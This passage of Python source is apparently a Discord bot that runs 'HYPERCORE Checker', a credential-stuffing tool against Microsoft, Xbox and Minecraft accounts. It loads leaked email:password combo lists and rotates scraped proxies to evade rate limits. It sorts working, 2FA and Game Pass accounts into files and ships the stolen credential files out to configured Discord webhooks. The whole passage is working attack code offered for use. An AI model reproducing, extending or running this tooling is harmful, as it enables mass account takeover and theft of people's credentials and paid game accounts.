            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxies = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    max_tries = CONFIG.get('max_retries', 5) if CONFIG.get('max_retries', 5) > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=15)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries+=1
                session.proxies = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                loop_tries += 1
                continue
            else: break
        except:
            retries+=1
            session.proxies = getproxy()
            loop_tries += 1
            continue

def checkmc(session, email, password, token):
    global retries, cpm, checked, xgp, xgpu, other
    max_tries = CONFIG.get('max_retries', 5) if CONFIG.get('max_retries', 5) > 0 else 5
    loop_tries = 0
    while loop_tries < max_tries:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=15)
        except:
            retries += 1
            session.proxies = getproxy()
            loop_tries += 1
            continue
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]", session)
                    CAPTURE.handle(session)
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxies = getproxy()
            if len(proxylist) < 1: time.sleep(20)
            loop_tries += 1
            continue
        else:
            return False
    return False

def mc_token(session, uhs, xsts_token):
    global retries
    max_tries = CONFIG.get('max_retries', 5) if CONFIG.get('max_retries', 5) > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: time.sleep(20)
                tries += 1
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxies = getproxy()
            tries += 1
            continue
    return None

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < CONFIG.get('max_retries', 5):
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load(filename):
    global Combos, fname
    if filename is None:
        return False, "Invalid File."
    else:
        fname = os.path.splitext(os.path.basename(filename))[0]
        try:
            with open(filename, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                return True, f"[{str(len(lines) - len(Combos))}] Dupes Removed.\n[{len(Combos)}] Combos Loaded."
        except:
            return False, "Your file is probably harmed."

def Proxys(file_path):
    global proxylist
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    proxylist.append(proxyline)
                except: pass
        return True, f"Loaded [{len(proxylist)}] proxies."
    except Exception:
        return False, "Your file is probably harmed."

def getproxy():
    if proxytype == "'4'":
        return None
    if len(proxylist) == 0:
        return None
    try:
        proxy = random.choice(proxylist)
        # Handle case where proxy is already a dict (from auto-scraper)
        if isinstance(proxy, dict):
            return proxy
        # Handle case where proxy is a string (from file loading)
        if proxytype == "'1'" or proxytype == "'5'":
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype == "'2'":
            return {'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy}
        elif proxytype == "'3'":
            return {'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy}
        else:
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
    except:
        return None

def Checker(combo):
    global bad, checked, cpm
    try:
        # Automatically remove text after the combo (e.g. "Bad: user@domain.com:pass | status...")
        # Clean the string first
        clean_combo = combo.strip()
        
        # Remove common numbering like "1. ", "2) ", etc.
        clean_combo = re.sub(r'^\d+[\.\)\s]+', '', clean_combo)
        
        # Remove common prefixes like "Bad: " or "Hit: "
        if ": " in clean_combo[:10]: 
            clean_combo = clean_combo.split(": ", 1)[1]
        
        # Split by whitespace or pipe to remove trailing info
        clean_combo = clean_combo.split(" ")[0].split("|")[0].strip()
        
        split = clean_combo.split(":")
        if len(split) >= 2:
            email = split[0].strip()
            password = split[1].strip()
            if email != "" and password != "":
                authenticate(str(email), str(password))
            else:
                if screen == "'2'": print(Fore.RED+f"Bad: {clean_combo}")
                bad+=1
                cpm+=1
                checked+=1
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {clean_combo}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def get_emoji(name):
    emojis = CONFIG.get("emojis") or {}
    return emojis.get(name, f":{name}:")

def setup_checker():
    """Initialize the checker configuration"""
    try:
        print("✅ HYPERCORE Checker configuration loaded")
    except Exception as e:
        print(f"❌ Error loading config: {e}")

# scraper
def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        try:
            http.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks4: 
        try:
            socks4.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks5: 
        try:
            socks5.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500", timeout=30).json().get('data', []):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500", timeout=30).json().get('data', []):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: 
        if proxy.strip(): proxylist.append({'http': 'http://'+proxy.strip(), 'https': 'http://'+proxy.strip()})
    for proxy in socks4: 
        if proxy.strip(): proxylist.append({'http': 'socks4://'+proxy.strip(),'https': 'socks4://'+proxy.strip()})
    for proxy in socks5: 
        if proxy.strip(): proxylist.append({'http': 'socks5://'+proxy.strip(),'https': 'socks5://'+proxy.strip()})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    autoscrape_time = CONFIG.get('auto_scrape_minutes')
    if autoscrape_time and autoscrape_time > 0:
        time.sleep(autoscrape_time * 60)
        get_proxies()

def banproxyload(file_path):
    global banproxies
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    banproxies.append(proxyline)
                except: pass
        return True, f"Loaded [{len(banproxies)}] ban proxies."
    except Exception:
        return False, "Your file is probably harmed."

# Discord Bot Implementation
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents)
synced_commands = False

# Global variables for checker control
active_checkers = {}

class CheckerSession:
    def __init__(self, interaction, threads, proxy_type, combos_files, proxies_file=None, webhook_url=None, delay=0):
        self.interaction = interaction
        self.threads = threads
        self.proxy_type = proxy_type
        self.combos_files = combos_files # List of files
        self.proxies_file = proxies_file
        self.webhook_url = webhook_url
        self.delay = delay
        self.session_id = str(interaction.id)
        self.is_running = True
        self.status_msg = None # Store the status message object
        self.stats = {
            'checked': 0,
            'total': 0,
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'sfa': 0,
            'mfa': 0,
            'xgp': 0,
            'xgpu': 0,
            'other': 0,
            'vm': 0,
            'errors': 0,
            'retries': 0,
            'unbanned': 0,
            'banned_count': 0,
            'start_time': datetime.now(),
            'cpm': 0,
            'last_checked_count': 0,
            'last_cpm_update': time.time()
        }
        
    def create_progress_bar(self, percentage, width=20):
        """Create a text progress bar"""
        filled = int(width * percentage // 100)
        bar = '█' * filled + '░' * (width - filled)
        return f"`{bar}` {percentage:.1f}%"
        
    async def send_status_update(self):
        """Send or edit status update to Discord channel with live progress bar"""
        if not self.is_running:
            return
            
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        # Calculate CPM (Checks Per Minute)
        current_time = time.time()
        time_diff = current_time - self.stats['last_cpm_update']
        if time_diff >= 5:  # Update CPM every 5 seconds
            checked_diff = self.stats['checked'] - self.stats['last_checked_count']
            self.stats['cpm'] = int((checked_diff / time_diff) * 60)
            self.stats['last_checked_count'] = self.stats['checked']
            self.stats['last_cpm_update'] = current_time
        
        progress_percent = (self.stats['checked'] / self.stats['total']) * 100 if self.stats['total'] > 0 else 0
        progress_bar = self.create_progress_bar(progress_percent)
        
        hypercore_branding = CONFIG.get('hypercore_branding', {})
        status_message = hypercore_branding.get('status_message', 'HYPERCORE Checking System')
        embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
        
        embed = discord.Embed(
            title=f"⚡ HYPERCORE Premium Checker ⚡",
            color=discord.Color.purple(),
            timestamp=datetime.now()
        )
        
        embed.set_thumbnail(url=embed_thumbnail)
        
        # Progress Bar
        embed.add_field(
            name=f"📊 Progress Status",
            value=f"{progress_bar}\n`{self.stats['checked']:,}/{self.stats['total']:,}` accounts",
            inline=False
        )
        
        # Speed Stats
        embed.add_field(
            name=f"🚀 Speed",
            value=f"CPM: `{self.stats['cpm']}`\nThreads: `{self.threads}`",
            inline=True
        )
        
        # Time Stats
        embed.add_field(
            name=f"⏱️ Time",
            value=f"Elapsed: `{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}`\nETA: `{self.calculate_eta()}`",
            inline=True
        )
        
        # Results
        embed.add_field(
            name=f"✅ Results",
            value=f"Hits: `{self.stats['hits']:,}`\nBad: `{self.stats['bad']:,}`\n2FA: `{self.stats['twofa']:,}`",
            inline=True
        )
        
        # Account Types
        embed.add_field(
            name=f"🎮 Account Types",
            value=f"SFA: `{self.stats['sfa']:,}`\nMFA: `{self.stats['mfa']:,}`\nValid Mail: `{self.stats['vm']:,}`",
            inline=True
        )
        
        # Xbox & Other
        embed.add_field(
            name=f"🎯 Xbox & Other",
            value=f"XGP: `{self.stats['xgp']:,}`\nXGPU: `{self.stats['xgpu']:,}`\nOther: `{self.stats['other']:,}`",
            inline=True
        )
        
        # Ban Status
        embed.add_field(
            name=f"🔴 Ban Status",
            value=f"Unbanned: `{self.stats['unbanned']:,}`\nBanned: `{self.stats['banned_count']:,}`",
            inline=True
        )
        
        # Technical
        embed.add_field(
            name=f"⚙️ Technical",
            value=f"Retries: `{self.stats['retries']:,}`\nErrors: `{self.stats['errors']:,}`",
            inline=True
        )
        
        embed.set_footer(text=f"HYPERCORE • Session ID: {self.session_id[:8]}", icon_url=embed_thumbnail)
        
        try:
            if self.status_msg:
                await self.status_msg.edit(embed=embed)
            else:
                self.status_msg = await self.interaction.followup.send(embed=embed)
        except Exception as e:
            print(f"Failed to update status: {e}")

    def calculate_eta(self):
        """Calculate estimated time remaining"""
        if self.stats['cpm'] <= 0 or self.stats['checked'] >= self.stats['total']:
            return "N/A"
        
        remaining = self.stats['total'] - self.stats['checked']
        minutes_remaining = remaining / (self.stats['cpm'] / 60) if self.stats['cpm'] > 0 else 0
        
        if minutes_remaining < 1:
            return "< 1 minute"
        elif minutes_remaining < 60:
            return f"{int(minutes_remaining)} minutes"
        else:
            hours = int(minutes_remaining // 60)
            minutes = int(minutes_remaining % 60)
            return f"{hours}h {minutes}m"

    async def run_checker(self):
        global current_session, session_webhook_url, Combos, fname, proxytype, screen, hits, bad, twofa, sfa, mfa, xgp, xgpu, other, vm, errors, retries, checked, unbanned, banned_count
        
        try:
            # Set current session for stop checks
            current_session = self
            session_webhook_url = self.webhook_url  # Set the global webhook URL
            
            all_combos = []
            import zipfile
            for combo_file in self.combos_files:
                if combo_file.endswith('.zip'):
                    with zipfile.ZipFile(combo_file, 'r') as zip_ref:
                        for name in zip_ref.namelist():
                            if name.endswith('.txt'):
                                with zip_ref.open(name) as f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    all_combos.extend(content.splitlines())
                else:
                    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                        all_combos.extend(f.readlines())
            
            Combos = list(set(all_combos))
            self.stats['total'] = len(Combos)
            
            if self.stats['total'] == 0:
                await self.interaction.followup.send("❌ No valid combos found in the uploaded files.")
                return

            # Setup proxy type globally
            proxytype = self.proxy_type
            screen = "'2'"  # Log mode
            
            # Load proxies if provided and needed
            if self.proxies_file and proxytype != "'4'" and proxytype != "'5'":
                with open(self.proxies_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if line.strip():
                            proxylist.append(line.strip())
            
            # Auto scrape proxies if selected
            if proxytype == "'5'":
                await self.interaction.followup.send("🔄 Scraping proxies...")
                threading.Thread(target=get_proxies, daemon=True).start()
                # Wait for proxies to be scraped
                max_wait = 30
                waited = 0
                while len(proxylist) == 0 and waited < max_wait:
                    await asyncio.sleep(1)
                    waited += 1
                if len(proxylist) == 0:
                    await self.interaction.followup.send("❌ Failed to scrape proxies. Switching to proxyless mode.")
                    proxytype = "'4'"
            
            # Create results directory
            fname = f"hypercore_check_{self.session_id}"
            if not os.path.exists(f"results/{fname}"):
                os.makedirs(f"results/{fname}")
            
            # Start status updates
            asyncio.create_task(self.status_loop())
            
            # Send starting message
            hypercore_branding = CONFIG.get('hypercore_branding', {})
            embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
            
            embed = discord.Embed(
                title="⚡ HYPERCORE Checker Started ⚡",
                color=discord.Color.purple(),
                description=f"Checking `{self.stats['total']:,}` accounts with `{self.threads}` threads"
            )
            embed.set_thumbnail(url=embed_thumbnail)
            embed.add_field(name="Proxy Type", value=self.get_proxy_type_name(), inline=True)
            embed.add_field(name="Session ID", value=self.session_id[:8], inline=True)
            embed.add_field(name="Webhook", value="✅ Set", inline=True)
            if self.delay > 0:
                embed.add_field(name="Delay", value=f"{self.delay}s", inline=True)
            embed.set_footer(text="HYPERCORE Premium Checker", icon_url=embed_thumbnail)
            await self.interaction.followup.send(embed=embed)
            
            # Reset global counters
            hits = 0
            bad = 0
            twofa = 0
            sfa = 0
            mfa = 0
            xgp = 0
            xgpu = 0
            other = 0
            vm = 0
            errors = 0
            retries = 0
            checked = 0
            unbanned = 0
            banned_count = 0
            
            # Run checker in a separate thread
            loop = asyncio.get_running_loop()
            
            await loop.run_in_executor(None, self._run_checker_blocking)
            
            # Send final summary
            await self.send_final_summary("🏁 HYPERCORE Checker Completed")
            
            # Send all result files at the end
            await self.send_all_result_files()
            
            # Prepare results for user
            results_path = f"results/hypercore_check_{self.session_id}"
            zip_path = f"hypercore_results_{self.session_id}.zip"
            try:
                import zipfile
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    for root, dirs, files in os.walk(results_path):
                        for file in files:
                            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), results_path))
                
                # Send results to user
                await self.send_results_to_user(self.interaction, zip_path, self.session_id)
            except Exception as e:
                print(f"Error zipping/sending results: {e}")
                await self.interaction.followup.send(f"❌ Error processing results: {e}")
            
        except Exception as e:
            await self.interaction.followup.send(f"❌ HYPERCORE Checker error: {str(e)}")
            print(f"Checker error: {traceback.format_exc()}")
        finally:
            # Cleanup
            if self.session_id in active_checkers:
                del active_checkers[self.session_id]
            if current_session == self:
                current_session = None
            session_webhook_url = None
            
            for f in self.combos_files:
                try: os.remove(f)
                except: pass
            if self.proxies_file:
                try: os.remove(self.proxies_file)
                except: pass

    def _run_checker_blocking(self):
        """Blocking method that runs the ThreadPoolExecutor work with optimized thread usage"""
        global session_webhook_url, Combos, hits, bad, twofa, sfa, mfa, xgp, xgpu, other, vm, errors, retries, checked, unbanned, banned_count
        
        # Create a thread-safe queue for combos
        combo_queue = queue.Queue()
        for combo in Combos:
            combo_queue.put(combo)
        
        total_combos = combo_queue.qsize()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            def worker():
                while self.is_running:
                    try:
                        combo = combo_queue.get_nowait()
                    except queue.Empty:
                        break
                    
                    try:
                        # Apply rate limiting if needed
                        if self.proxy_type == "'4'" and self.delay == 0:
                            # Smart rate limiting for proxyless
                            time.sleep(random.uniform(2.0, 4.0))
                        elif self.delay > 0:
                            time.sleep(self.delay)
                        
                        # Run the checker
                        Checker(combo)
                        
                        # Update stats after each check
                        self.stats['checked'] = checked
                        self.stats['hits'] = hits
                        self.stats['bad'] = bad
                        self.stats['twofa'] = twofa
                        self.stats['sfa'] = sfa
                        self.stats['mfa'] = mfa
                        self.stats['xgp'] = xgp
                        self.stats['xgpu'] = xgpu
                        self.stats['other'] = other
                        self.stats['vm'] = vm
                        self.stats['errors'] = errors
                        self.stats['retries'] = retries
                        self.stats['unbanned'] = unbanned
                        self.stats['banned_count'] = banned_count
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                    finally:
                        combo_queue.task_done()
            
            # Start workers
            futures = [executor.submit(worker) for _ in range(min(self.threads, total_combos))]
            
            # Wait for all workers to complete
            concurrent.futures.wait(futures)

    def get_proxy_type_name(self):
        proxy_names = {
            "'1'": "HTTP",
            "'2'": "SOCKS4", 
            "'3'": "SOCKS5",
            "'4'": "None (Proxyless)",
            "'5'": "Auto Scraper"
        }
        return proxy_names.get(self.proxy_type, "Unknown")

    async def status_loop(self):
        """Send status updates every 5 seconds for smoother progress"""
        while self.is_running and self.stats['checked'] < self.stats['total']:
            await self.send_status_update()
            await asyncio.sleep(5)  # Update every 5 seconds for smoother progress

    async def send_final_summary(self, title="🏁 HYPERCORE Checker Completed"):
        """Send final summary when checker completes or is stopped"""
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        hypercore_branding = CONFIG.get('hypercore_branding', {})
        embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
        
        # Calculate final CPM
        avg_cpm = int((self.stats['checked'] / (elapsed.total_seconds() / 60)) if elapsed.total_seconds() > 0 else 0)
        
        embed = discord.Embed(
            title=title,
            color=discord.Color.purple() if self.stats['checked'] >= self.stats['total'] else discord.Color.orange(),
            timestamp=datetime.now()
        )
        
        embed.set_thumbnail(url=embed_thumbnail)
        
        # Add status based on completion
        if self.stats['checked'] < self.stats['total']:
            embed.description = f"**Stopped by user** - {self.stats['checked']:,}/{self.stats['total']:,} accounts checked"
        else:
            embed.description = f"**Completed** - All {self.stats['total']:,} accounts checked"
        
        # Summary Stats
        embed.add_field(
            name=f"📊 Summary",
            value=f"**Checked**: `{self.stats['checked']:,}`\n**Hits**: `{self.stats['hits']:,}`\n**Bad**: `{self.stats['bad']:,}`\n**2FA**: `{self.stats['twofa']:,}`",
            inline=True
        )
        
        embed.add_field(
            name=f"⚡ Performance",
            value=f"**Avg CPM**: `{avg_cpm}`\n**Duration**: `{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}`\n**Threads**: `{self.threads}`",
            inline=True
        )
        
        embed.add_field(
            name=f"🎮 Account Types",
            value=f"**SFA**: `{self.stats['sfa']:,}`\n**MFA**: `{self.stats['mfa']:,}`\n**XGP**: `{self.stats['xgp']:,}`\n**XGPU**: `{self.stats['xgpu']:,}`",
            inline=True
        )
        
        embed.add_field(
            name=f"🔴 Ban Status",
            value=f"**Unbanned**: `{self.stats['unbanned']:,}`\n**Banned**: `{self.stats['banned_count']:,}`",
            inline=True
        )
        
        embed.add_field(
            name=f"⚙️ Technical",
            value=f"**Retries**: `{self.stats['retries']:,}`\n**Errors**: `{self.stats['errors']:,}`",
            inline=True
        )
        
        embed.set_footer(text=f"HYPERCORE Premium • Session ID: {self.session_id[:8]}", icon_url=embed_thumbnail)
        
        await self.interaction.followup.send(embed=embed)
        
        # Send to webhook if provided
        if self.webhook_url:
            await self.send_webhook_summary()

    async def send_all_result_files(self):
        """Send all result files as a single batch after completion to ResultsWebhook"""
        try:
            results_path = f"results/{fname}"
            if not os.path.exists(results_path):
                return

            webhook_urls = []
            
            # Get ResultsWebhook from config
            results_webhook = CONFIG.get("ResultsWebhook")
            if results_webhook and results_webhook.strip():
                webhook_urls.extend([u.strip() for u in results_webhook.split(',') if u.strip()])
            
            # Also send to session webhook if provided
            if self.webhook_url and self.webhook_url.startswith('http'):
                webhook_urls.append(self.webhook_url)
            
            webhook_urls = list(set([u for u in webhook_urls if u and u.startswith('http')]))
            
            if not webhook_urls:
                return

            # Find all .txt files in the results directory
            files_to_send = {}
            for root, dirs, files in os.walk(results_path):
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        if os.path.getsize(file_path) > 0:
                            files_to_send[file] = open(file_path, 'rb')

            if not files_to_send:
                return

            hypercore_branding = CONFIG.get('hypercore_branding', {})
            webhook_username = hypercore_branding.get('webhook_username', 'HYPERCORE Checker')
            embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
            
            # Create embed for the results
            embed = discord.Embed(
                title="📁 HYPERCORE Results Files",
                color=discord.Color.purple(),
                description=f"**Session ID:** `{self.session_id[:8]}`\n**Total Checked:** `{self.stats['checked']:,}`\n**Hits:** `{self.stats['hits']:,}`",
                timestamp=datetime.now()
            )
            
            # Add file list
            file_list = "\n".join([f"📄 {file}" for file in files_to_send.keys()])
            if len(file_list) > 1024:
                file_list = file_list[:1000] + "..."
            
            embed.add_field(name="Files Generated", value=file_list, inline=False)
            embed.set_thumbnail(url=embed_thumbnail)
            embed.set_footer(text="HYPERCORE Premium Checker", icon_url=embed_thumbnail)
            
            for url in webhook_urls:
                try:
                    # Reset file pointers for each webhook
                    for f in files_to_send.values():
                        f.seek(0)
                    
                    # Send files with the embed
                    requests.post(
                        url, 
                        data={"username": webhook_username}, 
                        files=files_to_send,
                        timeout=30
                    )
                    
                    # Also send the embed separately
                    requests.post(
                        url,
                        json={"username": webhook_username, "embeds": [embed.to_dict()]},
                        headers={"Content-Type": "application/json"},
                        timeout=10
                    )
                    
                except Exception as e:
                    print(f"Failed to send result files to {url}: {e}")
            
            # Close all file handles
            for f in files_to_send.values():
                f.close()
                
        except Exception as e:
            print(f"Error sending result files: {e}")

    async def send_webhook_summary(self):
        """Send summary to webhook"""
        hypercore_branding = CONFIG.get('hypercore_branding', {})
        webhook_username = hypercore_branding.get('webhook_username', 'HYPERCORE Checker')
        embed_footer = hypercore_branding.get('embed_footer', 'HYPERCORE Premium Checker')
        embed_thumbnail = hypercore_branding.get('embed_thumbnail', 'https://cdn.discordapp.com/attachments/1474739190582349866/1474754021947478099/73602.gif')
        
        webhook_data = {
            "username": webhook_username,
            "embeds": [{
                "title": "⚡ HYPERCORE Checker Summary ⚡",
                "color": 0x9b59b6,  # Purple color
                "fields": [
                    {"name": "Total Accounts", "value": f"`{self.stats['total']:,}`", "inline": True},
                    {"name": "Checked", "value": f"`{self.stats['checked']:,}`", "inline": True},
                    {"name": "Hits", "value": f"`{self.stats['hits']:,}`", "inline": True},
                    {"name": "Bad", "value": f"`{self.stats['bad']:,}`", "inline": True},
                    {"name": "2FA", "value": f"`{self.stats['twofa']:,}`", "inline": True},
                    {"name": "Session ID", "value": f"`{self.session_id[:8]}`", "inline": False}
                ],
                "thumbnail": {"url": embed_thumbnail},
                "footer": {"text": embed_footer},
                "timestamp": datetime.now(timezone.utc).isoformat()
            }]
        }
        
        try:
            if self.webhook_url and str(self.webhook_url).startswith('http'):
                requests.post(self.webhook_url, json=webhook_data, timeout=10)
        except Exception as e:
            print(f"Failed to send webhook: {e}")

    async def send_results_to_user(self, interaction, zip_path, filename):
        """Send results file to user's DMs or channel if DM fails"""
        try:
            file = discord.File(zip_path, filename=f"hypercore_results_{filename[:8]}.zip")
            try:
                await interaction.user.send(content=f"⚡ **HYPERCORE checking finished!** ⚡\nHere are your results for `{filename[:8]}`", file=file)
                await interaction.followup.send(f"✅ HYPERCORE checking finished! Results for `{filename[:8]}` have been sent to your DMs.")
            except discord.Forbidden:
                await interaction.followup.send(f"⚠️ I couldn't DM you the results, so I'm sending them here instead.", file=file)
            
            # Also send to results webhook if configured
            results_webhook = CONFIG.get("ResultsWebhook")
            if results_webhook and str(results_webhook).startswith('http'):
                try:
                    with open(zip_path, 'rb') as f:
                        hypercore_branding = CONFIG.get('hypercore_branding', {})
                        webhook_username = hypercore_branding.get('webhook_username', 'HYPERCORE Checker')
                        requests.post(results_webhook, files={'file': f}, data={'content': f'⚡ HYPERCORE results for {filename[:8]}', 'username': webhook_username}, timeout=30)
                except Exception as webhook_e:
                    print(f"Results webhook error: {webhook_e}")
        except Exception as e:
            print(f"Error sending results: {e}")
            await interaction.followup.send(f"❌ Error sending results: {e}")
        finally:
            if os.path.exists(zip_path):
                os.remove(zip_path)

